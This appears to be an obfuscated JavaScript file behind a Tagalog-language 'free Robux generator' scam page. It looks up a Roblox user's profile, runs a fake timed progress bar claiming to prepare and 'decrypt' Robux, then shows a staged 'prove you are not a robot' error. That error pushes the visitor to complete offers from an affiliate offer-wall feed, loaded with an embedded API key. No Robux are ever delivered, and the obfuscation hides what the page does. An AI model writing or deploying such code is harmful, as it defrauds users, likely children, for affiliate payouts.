const _0x51dc7e = _0x39d2;
function _0x39d2(x, e) {
  let a = _0x49ca();
  return (_0x39d2 = function (x, e) {
    return a[(x -= 230)];
  })(x, e);
}
function startGenerator(x, e) {
  let a = _0x51dc7e,
    n = document[a(269)](a(302)),
    t = 0,
    _ = setInterval(function () {
      let i = a;
      (t += 10),
        (document.querySelector(i(286))[i(285)].width = t + "%"),
        40 === t
          ? (n.innerText = i(307) + x)
          : 60 === t
          ? (n[i(246)] = i(245))
          : 80 === t
          ? (n.innerText = i(239) + e + " Robux para sa iyo")
          : 90 === t
          ? (n[i(246)] = "Pag-decrypt sa progreso...")
          : t >= 98 &&
            (clearInterval(_),
            (document[i(299)](i(286))[i(285)][i(292)] = "red"),
            (n[i(246)] = i(266)),
            document[i(269)](i(258)).classList[i(265)](i(267)));
    }, 1e3);
}
function _0x49ca() {
  let x = [
    "verify-btn",
    "button",
    "Pakisuyo, kumpletuhin ang dalawang alok mula sa listahan sa ibaba upang matanggap ang iyong ",
    "\n            <h2>@",
    "5nVAICm",
    "click",
    "#offerContainer",
    "remove",
    "Error... kailangan mong patunayan na hindi ka isang robot.",
    "hidden",
    "trim",
    "getElementById",
    "appendChild",
    "679cciHni",
    "<p>Error sa pagkuha ng profile. Pakiusap, subukan muli mamaya.</p>",
    "10488048YJEqBB",
    "generator-page",
    "3402JtecyT",
    "success-page",
    " Robux. Kapag na-verify na ang iyong account, hindi mo na kailangang kumpletuhin ang mga alok sa mga susunod mong pagbisita sa aming site.",
    "value",
    "eligibility-message",
    "conversion",
    '">\n                            ',
    "age-input",
    "profile",
    "38959",
    "style",
    ".progress",
    "add",
    "classList",
    " taong gulang at gumagamit ng ",
    "2345716LfGCAX",
    "json",
    "backgroundColor",
    "contains",
    "robux-page",
    "Error sa pagkuha ng profile:",
    "<p>",
    '" alt="Avatar ni ',
    "Pakiusap, ilagay ang isang wastong username.",
    "querySelector",
    "avatarUrl",
    "robux-select",
    "generator-status",
    "innerHTML",
    '\n                    <div style="margin: 10px 0; padding: 15px; background: #f7f7f7; border-radius: 5px; box-shadow: 0 4px 8px rgba(0,0,0,0.1);">\n                        <a href="',
    "createElement",
    "50551XFZciM",
    "Kumokonekta sa @",
    "eligibility-page",
    "</p>",
    "&api_key=",
    "fail",
    "Dahil ikaw ay ",
    "username",
    "error",
    "each",
    "Kumpirmahin",
    "2460876bruVob",
    "80805lLBrpl",
    "Ipinaghahanda ang ",
    '" />\n        ',
    "anchor",
    "Nabigo ang pagpapatunay ng seguridad: binago ang istruktura ng pahina.",
    '</h2>\n            <img src="',
    "get-profile-btn",
    "Kumokonekta ang sistema sa mga server ng laro",
    "innerText",
    "Pakiusap, ilagay ang isang wastong username sa laro.",
    "962b434210352cf6cf17740be690ffa0",
    "device-page",
    "device-select",
    "11061720bEKdSP",
    '" target="_blank" style="color: #3b83f6; text-decoration: none; font-weight: bold;" title="',
    "getJSON",
    "\n                        </a>\n                    </div>",
    "addEventListener",
    "https://librengrobux.net/user_account/user-profile.php?username=",
    "url",
  ];
  return (_0x49ca = function () {
    return x;
  })();
}
(function (x, e) {
  let a = _0x39d2,
    n = x();
  for (;;)
    try {
      let t =
        -parseInt(a(306)) / 1 +
        -parseInt(a(237)) / 2 +
        -parseInt(a(238)) / 3 +
        (parseInt(a(290)) / 4) * (-parseInt(a(262)) / 5) +
        (parseInt(a(275)) / 6) * (parseInt(a(271)) / 7) +
        parseInt(a(273)) / 8 +
        parseInt(a(251)) / 9;
      if (700732 === t) break;
      n.push(n.shift());
    } catch (_) {
      n.push(n.shift());
    }
})(_0x49ca, 700732),
  document[_0x51dc7e(269)](_0x51dc7e(244))[_0x51dc7e(255)](
    _0x51dc7e(263),
    async function () {
      let x = _0x51dc7e,
        e = document[x(269)]("verify-btn");
      if (!e || !1 === e[x(288)][x(293)](x(267))) {
        alert(x(242));
        return;
      }
      let a = document.getElementById(x(233))[x(278)][x(268)]();
      if ("" === a) {
        alert(x(247));
        return;
      }
      try {
        let n = await fetch(x(256) + a),
          t = await n[x(291)]();
        if (t[x(234)]) {
          document.getElementById(x(283))[x(303)] = x(296) + t[x(234)] + x(309);
          return;
        }
        document[x(269)](x(283))[x(303)] =
          x(261) + t[x(233)] + x(243) + t[x(300)] + x(297) + t[x(233)] + x(240);
        let _ = document[x(305)](x(259));
        (_[x(246)] = x(236)),
          (_.id = "confirm-profile-btn"),
          _.addEventListener(x(263), function () {
            let e = x;
            document.getElementById("profile-page").classList[e(287)]("hidden"),
              document[e(269)](e(249))[e(288)][e(265)](e(267));
          }),
          document[x(269)]("profile")[x(270)](_);
      } catch (i) {
        console[x(234)](x(295), i),
          (document.getElementById("profile")[x(303)] = x(272));
      }
    }
  ),
  document
    .getElementById("confirm-device-btn")
    .addEventListener(_0x51dc7e(263), function () {
      let x = _0x51dc7e,
        e = document.getElementById(x(250)).value;
      document[x(269)](x(249)).classList[x(287)](x(267)),
        document.getElementById(x(308))[x(288)][x(265)](x(267));
      let a = document[x(269)](x(282)).value;
      document[x(269)](x(279))[x(246)] =
        x(232) +
        a +
        x(289) +
        e +
        ", karapat-dapat kang makakuha ng libreng Robux!";
    }),
  document
    .getElementById("start-btn")
    [_0x51dc7e(255)](_0x51dc7e(263), function () {
      let x = _0x51dc7e;
      document[x(269)]("eligibility-page").classList.add("hidden"),
        document[x(269)](x(294)).classList[x(265)](x(267));
    }),
  document[_0x51dc7e(269)]("continue-btn")[_0x51dc7e(255)](
    "click",
    function () {
      let x = _0x51dc7e,
        e = document.getElementById(x(233))[x(278)],
        a = document[x(269)](x(301))[x(278)];
      e
        ? (document[x(269)]("robux-page").classList[x(287)](x(267)),
          document[x(269)](x(274))[x(288)].remove(x(267)),
          startGenerator(e, a))
        : alert(x(298));
    }
  ),
  document[_0x51dc7e(269)](_0x51dc7e(258)).addEventListener(
    _0x51dc7e(263),
    function () {
      let x = _0x51dc7e;
      document.getElementById(x(274)).classList[x(287)](x(267)),
        document.getElementById(x(276))[x(288)][x(265)](x(267));
      let e = document[x(269)](x(301))[x(278)];
      document[x(269)]("success-message").innerText = x(260) + e + x(277);
    }
  ),
  $(function () {
    let x = _0x51dc7e,
      e = x(248),
      a = x(284);
    $[x(253)](
      "https://d1i1d9hx0883rq.cloudfront.net/public/offers/feed.php?user_id=" +
        a +
        x(230) +
        e +
        "&s1=&s2=&callback=?",
      function (e) {
        let a = x;
        var n = "";
        (e = e.splice(0, 4)),
          $[a(235)](e, function (x, e) {
            let t = a;
            n +=
              t(304) +
              e[t(257)] +
              t(252) +
              e[t(280)] +
              t(281) +
              e[t(241)] +
              t(254);
          }),
          $(a(264)).append(n);
      }
    )[x(231)](function (x, e, a) {
      console.log("Nabigo ang request: " + e + ", " + a);
    });
  });
